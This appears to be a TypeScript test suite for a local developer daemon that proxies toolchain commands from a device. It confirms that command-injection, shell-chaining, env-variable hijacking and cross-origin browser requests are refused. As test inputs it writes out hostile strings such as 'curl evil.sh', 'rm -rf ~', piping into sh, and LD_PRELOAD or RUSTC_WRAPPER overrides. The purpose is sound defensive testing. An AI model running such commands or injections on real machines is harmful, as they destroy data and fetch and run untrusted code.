/* SPDX-License-Identifier: MIT */
import { afterAll, beforeAll, expect, test } from "bun:test"
import path from "node:path"

// cargo-proxy runs arbitrary toolchain commands on the developer's PC on behalf
// of a device reached through `adb reverse`. Its header promised "whitelisted
// toolchain commands" but nothing enforced it, so every POST to /exec was
// remote code execution — reachable from any page the developer's browser
// loaded, since 127.0.0.1 is not a barrier against the browser itself.
//
// These run the real daemon and check that each guard refuses before anything
// is spawned. No accepted command is exercised: acceptance is proven instead by
// a well-formed request getting past the guards and failing later, on the
// deviceCwd shape, with no adb or shell involved.

const SCRIPT = path.resolve(import.meta.dir, "../../script/cargo-proxy.mjs")
const PORT = 19_337
const BASE = `http://127.0.0.1:${PORT}`

let daemon: ReturnType<typeof Bun.spawn>

async function post(body: unknown, headers: Record<string, string> = {}) {
  const response = await fetch(`${BASE}/exec`, {
    method: "POST",
    headers: { "Content-Type": "application/json", ...headers },
    body: JSON.stringify(body),
  })
  return { status: response.status, body: (await response.json()) as { error?: string } }
}

beforeAll(async () => {
  daemon = Bun.spawn([process.execPath, SCRIPT, "--port", String(PORT)], { stdout: "pipe", stderr: "pipe" })
  const deadline = Date.now() + 10_000
  while (Date.now() < deadline) {
    try {
      if ((await fetch(`${BASE}/health`)).ok) return
    } catch {
      // Not listening yet.
    }
    await Bun.sleep(25)
  }
  throw new Error("cargo-proxy did not start listening")
})

afterAll(() => {
  daemon?.kill()
})

test("refuses a command that is not a whitelisted toolchain tool", async () => {
  const { status, body } = await post({ deviceCwd: "/data/data/ai.unifia.mobile/files/p", command: "curl evil.sh" })
  expect({ status, error: body.error }).toEqual({ status: 403, error: "command is not a whitelisted toolchain tool: curl" })
})

test("refuses a whitelisted tool with a chained second command", async () => {
  for (const command of [
    "cargo build; rm -rf ~",
    "cargo build && curl evil.sh",
    "cargo build | sh",
    "cargo build $(curl evil.sh)",
    "cargo build `curl evil.sh`",
    "cargo build > /etc/hosts",
    "cargo build\nrm -rf ~",
  ]) {
    const { status, body } = await post({ deviceCwd: "/data/data/ai.unifia.mobile/files/p", command })
    expect({ command, status, error: body.error }).toEqual({
      command,
      status: 403,
      error: "command contains shell control characters",
    })
  }
})

test("refuses env keys that redirect binary resolution or inject code", async () => {
  for (const key of [
    "PATH",
    "PATHEXT",
    "LD_PRELOAD",
    "DYLD_INSERT_LIBRARIES",
    "NODE_OPTIONS",
    "BASH_ENV",
    // Each of these names a program cargo will then execute.
    "RUSTC",
    "RUSTC_WRAPPER",
    "CARGO_BUILD_RUSTC_WRAPPER",
    "CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER",
  ]) {
    const { status, body } = await post({
      deviceCwd: "/data/data/ai.unifia.mobile/files/p",
      command: "cargo build",
      env: { [key]: "/tmp/evil" },
    })
    expect({ key, status, error: body.error }).toEqual({ key, status: 403, error: `env key is not permitted: ${key}` })
  }
})

test("refuses a request a browser could have made", async () => {
  const browserish: Record<string, string>[] = [
    { Origin: "https://evil.example" },
    { "Sec-Fetch-Site": "cross-site" },
    { "Sec-Fetch-Mode": "no-cors" },
  ]
  for (const headers of browserish) {
    const { status, body } = await post({ deviceCwd: "/data/data/ai.unifia.mobile/files/p", command: "cargo build" }, headers)
    expect({ headers, status, error: body.error }).toEqual({
      headers,
      status: 403,
      error: "browser-originated requests are not accepted",
    })
  }

  // text/plain is the content type a cross-origin POST can use without a
  // preflight, which is exactly why it must not be accepted.
  const plain = await fetch(`${BASE}/exec`, {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: JSON.stringify({ deviceCwd: "/data/data/ai.unifia.mobile/files/p", command: "cargo build" }),
  })
  expect({ status: plain.status, error: ((await plain.json()) as { error?: string }).error }).toEqual({
    status: 403,
    error: "content-type must be application/json",
  })
})

test("lets a legitimate toolchain command through the guards", async () => {
  // Reaching the deviceCwd check means the caller, the command and the env all
  // passed; the daemon stops there rather than running anything, because this
  // path is not the /data/<pkg>/files/<sub> shape adb pull requires.
  const { status, body } = await post({ deviceCwd: "/not/a/device/path", command: "cargo build --release" })
  expect({ status, error: (body as { stderr?: string }).stderr }).toEqual({
    status: 500,
    error: "unsupported deviceCwd: /not/a/device/path",
  })
})
